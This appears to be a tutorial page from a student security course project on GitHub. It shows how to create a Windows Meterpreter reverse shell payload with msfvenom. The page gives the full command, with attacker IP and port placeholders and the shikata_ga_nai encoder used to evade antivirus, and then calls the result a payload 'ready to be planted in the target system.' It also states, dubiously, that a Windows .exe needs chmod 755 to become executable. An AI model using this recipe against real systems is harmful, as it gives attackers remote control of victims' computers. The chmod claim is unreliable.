# Creating a payload with Msfvenom

## Table of Contents

**[Home][H]**

**[1 - Using Metasploit][Metasploit]**

**[2 - Creating a Payload][Create]**

**[3 - Using Meterpreter][Meterpreter]**

**[4 - Keylogging][Keylog]**

---
To create a Meterpreter reverse shell, execute the following command

**msfvenom -p windows/meterpreter/reverse_tcp lhost=[attacker ip] lport[attacker port] --platform windows -e x86/shikata_ga_nai -f exe -o [name of payload executable].exe**.

<img src="https://raw.githubusercontent.com/yukun2h4ng/1600final/yukun2h4ng-patch-1/images/msfvenom.png" width="600">

---
While the file has an .exe extension, it is not actually an executable file yet. To do that, we need to make some changes to the file.

Execute the following command

**chmod 755 [name of payload executable].exe**

<img src="https://raw.githubusercontent.com/yukun2h4ng/1600final/yukun2h4ng-patch-1/images/executable.png" width="600">

Now we have a payload ready to be planted in the target system.

---


[H]: https://github.com/yukun2h4ng/1600final/blob/main/README.md
[Metasploit]: https://github.com/yukun2h4ng/1600final/blob/main/tutorial.md
[Create]: https://github.com/yukun2h4ng/1600final/blob/main/createpayload.md
[Meterpreter]: https://github.com/yukun2h4ng/1600final/blob/main/meterpreter.md
[Keylog]: https://github.com/yukun2h4ng/1600final/blob/main/keylogging.md
